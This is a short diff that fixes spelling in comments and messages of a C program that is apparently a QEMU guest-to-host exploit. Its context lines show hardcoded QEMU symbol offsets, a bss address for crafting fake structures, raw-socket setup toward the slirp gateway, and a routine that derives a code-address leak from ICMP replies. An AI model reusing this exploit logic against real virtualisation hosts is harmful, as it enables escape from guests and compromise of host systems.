@@ -22,7 +22,7 @@
     exit(EXIT_FAILURE);                         \
   }while(0);
 
-// * * * * * * * * * * * * * * *  Constans * * * * * * * * * * * * * * * * * *
+// * * * * * * * * * * * * * * *  Constants * * * * * * * * * * * * * * * * * *
 
 #define SRC_ADDR "10.0.2.15"
 #define DST_ADDR "10.0.2.2"
@@ -42,7 +42,7 @@
 #define MAIN_LOOP_TLG 0x10e81e0
 #define CPU_UPDATE_STATE 0x488190
 
-// Some place in bss which is not used to craft fake stucts
+// Some place in bss which is not used to craft fake structs
 #define FAKE_STRUCT 0xf43360
 
 // * * * * * * * * * * * * * * * QEMU Structs * * * * * * * * * * * * * * * * * *
@@ -334,7 +334,7 @@ void initialize() {
     die("setsockopt() failed to bind to interface ");
   }
 
-  printf("Initialized socket discriptors\n");
+  printf("Initialized socket descriptors\n");
 }
 
 
@@ -470,7 +470,7 @@ void recv_leaks(){
         (recv_iphdr->protocol == IPPROTO_ICMP) &&
         (recv_icmphdr->type == ICMP_ECHOREPLY) && (recv_icmphdr->code == 0) &&
         (recv_icmphdr->checksum == 0xffff)) {
-      hex_dump("Recieved ICMP Replay : ", recv_ether_frame, bytes);
+      hex_dump("Received ICMP Replay : ", recv_ether_frame, bytes);
 
       code_leak = (void *)(*((size_t *)&recv_ether_frame[0x40]) - CPU_UPDATE_STATE);
       size_t *ptr = (size_t *)(recv_ether_frame + 0x30);
